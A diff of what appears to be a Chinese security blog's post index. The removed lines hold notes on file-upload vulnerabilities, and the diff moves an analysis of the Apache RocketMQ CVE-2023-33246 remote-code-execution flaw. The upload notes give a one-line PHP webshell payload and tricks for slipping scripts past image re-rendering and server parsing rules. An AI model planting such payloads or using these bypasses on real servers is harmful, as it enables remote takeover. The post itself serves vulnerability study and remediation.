-<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%201.png</p>
-<p>这样修改之后，使用脚本工具将脚本写到图片中，这时候再上传可能还是会失败</p>
-<p><a href="jpg_secong_render_PLET.py">jpg_secong_render_PLET.py</a></p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%202.png"></p>
-<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%202.png</p>
-<p>尝试再次上传渲染</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%203.png"></p>
-<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%203.png</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成功~~~~~</span><br></pre></td></tr></table></figure>
-
-<p><strong>写入到IDAT数据块</strong></p>
-<p>直接跑脚本</p>
-<p><a href="jpg_second_render.php">png_second_render.php</a></p>
-<blockquote>
-<p>针对jpg文件</p>
-</blockquote>
-<p>直接上脚本</p>
-<p><a href="jpg_secong_render_PLET%201.py">jpg_secong_render_PLET.py</a></p>
-<p><a href="jpg_payload.php">jpg_payload.php</a></p>
-<p>注意事项：</p>
-<ol>
-<li>需要被 imagecreatefromjpeg 渲染或再用工具</li>
-<li>图片找的稍微大一点 成功率更高</li>
-<li>Payload 语句越短成功率越高</li>
-<li>一张图片不行就换一张 不要死磕</li>
-<li>国光补充：貌似白色的图片成功率也比较高</li>
-<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种payload 成功率很高</li>
-</ol>
-<p><strong>条件竞争—并发漏洞</strong></p>
-<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。在进行二次渲染的过程中可能存在该楼哦东</p>
-<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
-<p><strong>文件解析漏洞</strong></p>
-<p>再iis中如果上传*.asp;1.jpg的文件，iis会将该文件当作asp文件解析；将*.asp&#x2F;目录下的所有文件会被当成asp解析；默认会将扩展名为.asa，.cdx，.cer解析为asp</p>
-<p>在后端开启了cgi的情况下，请求这样的地址<code>http://www.armandhe.com/a.jpg/a.php</code> 其中a.jpg是我们请求的真实文件，a.php是不存在的一个文件，可以任意定义，此时a.jpg文件会被当作是php文件去解析执行。</p>
-<p><code>对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。 例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。</code></p>
-<p><code>php的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径， 例如：当php遇到文件路径&quot;/info.jpg/xxx.php/lxh.sec&quot;时 若&quot;/info.jpg/xxx.php/lxh.sec&quot;不存在，则会去掉最后的&quot;/lxh.sec&quot;，然后判断&quot;/info.jpg/xxx.php&quot;是否存在 若存在则将/info.jpg/xxx.php，当作文件/info.jpg/xxx.php/lxh.sec 若/info.jpg/xxx.php仍不存在，则继续去掉xxx.php,依此类推。</code></p>
-<p><strong>addhandler漏洞 ：AddHandler application&#x2F;x-httpd-php .jpg</strong></p>
-<p>如果这样设置，所有文件名中含有.php的文件都会被当作php文件执行。</p>
-<p>**换行漏洞：**php中的$修饰不仅可以匹配字符串的结尾，而且可以匹配所以这样的文件名是可以的1.php0A，如此的话就可以绕过正则表达式。</p>
-<p><strong>.&#x2F; :使用move_upload_file的时候，当文件存储的路径可控的时候，路径后面的&#x2F;.会被忽略，即<code>hack.php/.</code></strong></p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-        <tag>PHP</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -6384,70 +6389,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>Apache RocketMQ 远程代码执行（CVE-2023-33246）</title>
-    <url>/archives/3553c506.html</url>
-    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。漏洞源于RocketMQ的NameServer、Broker、Controller等多个组件暴露在公网中且缺乏权限校验。攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行任意操作系统命令。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
-<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
-<p>访问项目官方仓库获取受影响漏洞版本源码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>
-
-<p>使用idea导入项目后配置运行时环境变量<code>ROCKETMQ_HOME</code></p>
-<p><img src="/archives/3553c506/image-20230720155335454.png" alt="image-20230720155335454"></p>
-<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>，将以下内容复制到该文件中：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动ROCKETMQ Brocker，控制台输出以下内容则Brocker启动成功</p>
-<p><img src="/archives/3553c506/image-20230720155841681.png" alt="image-20230720155841681"></p>
-<p><strong>靶场搭建</strong></p>
-<p>使用vulhub靶场一键搭建</p>
-<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
-<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>Broker在启动时会首先创建一个<code>BrokerController</code>然后运行它</p>
-<p><img src="/archives/3553c506/image-20230720164935939.png" alt="image-20230720164935939"></p>
-<p>BrockerController创建过程中主要进行了配置文件解析、命令行解析、网络服务配置、日志配置等操作。</p>
-<p>Controller启动时相继启动以下服务，其中在启动<code>remotingServer</code>服务时会启动<code>broker</code>监听在默认的<code>10911</code>端口</p>
-<p><img src="/archives/3553c506/image-20230720165303285.png" alt="image-20230720165303285"></p>
-<p>在进行<code>filterServerManager</code>启动过程中会以30S的频率轮询创建<code>filterServer</code></p>
-<p><img src="/archives/3553c506/image-20230720165452954.png" alt="image-20230720165452954"></p>
-<p>创建<code>filterServer</code>时调用方法<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>解析数据拼接参数</p>
-<p><img src="/archives/3553c506/image-20230720165739570.png" alt="image-20230720165739570"></p>
-<p>在进行参数拼接过程中会从<code>brokerConfig</code>中获取<code>rocketmqHome</code>与<code>namesrvAddr</code>两个值。</p>
-<p>我们可以通过模拟RocketMQ协议向10911端口发送特制的数据包来影响<code>rocketmqHome</code>的值为可控的值，又因应用在进行命令拼接过程中未对用户的输入值进行有效的过滤，从而导致任意命令执行，此时我们使用网络上公开的PoC向10911端口发送数据然后调试</p>
-<p><img src="/archives/3553c506/image-20230720170706116.png" alt="image-20230720170706116"></p>
-<p><img src="/archives/3553c506/image-20230720170558173.png" alt="image-20230720170558173"></p>
-<p>可以看到，此时获取的<code>rocketmqHome</code>值已经变更为我们输入的Payload</p>
-<p>在<code>buildStartCommand</code>方法调用完毕后，会返回拼接的字符串然后调用<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>方法进行命令执行</p>
-<p>整个流程的调用栈为</p>
-<p><img src="/archives/3553c506/image-20230720171016289.png" alt="image-20230720171016289"></p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
-<p>2、关键服务增加用户权限校验；</p>
-<p>3、升级软件到不受影响的版本或最新版。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
-<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
-</ul>
-<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
-      <categories>
-        <category>漏洞分析</category>
-        <category>安全技术</category>
-      </categories>
-      <tags>
-        <tag>Apache RocketMQ</tag>
-        <tag>CVE-2023-33246</tag>
-        <tag>RCE</tag>
-        <tag>远程代码执行</tag>
-        <tag>反序列化</tag>
-        <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache RocketMQ 远程代码执行（CVE-2023-37582）</title>
     <url>/archives/968babfb.html</url>
     <content><![CDATA[<h1 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
@@ -6561,13 +6502,77 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </categories>
       <tags>
         <tag>Apache RocketMQ</tag>
+        <tag>CVE-2023-37582</tag>
         <tag>RCE</tag>
         <tag>远程代码执行</tag>
         <tag>反序列化</tag>
         <tag>网络安全</tag>
         <tag>漏洞分析</tag>
         <tag>漏洞</tag>
-        <tag>CVE-2023-37582</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache RocketMQ 远程代码执行（CVE-2023-33246）</title>
+    <url>/archives/3553c506.html</url>
+    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。漏洞源于RocketMQ的NameServer、Broker、Controller等多个组件暴露在公网中且缺乏权限校验。攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行任意操作系统命令。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
+<p>访问项目官方仓库获取受影响漏洞版本源码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>
+
+<p>使用idea导入项目后配置运行时环境变量<code>ROCKETMQ_HOME</code></p>
+<p><img src="/archives/3553c506/image-20230720155335454.png" alt="image-20230720155335454"></p>
+<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>，将以下内容复制到该文件中：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; 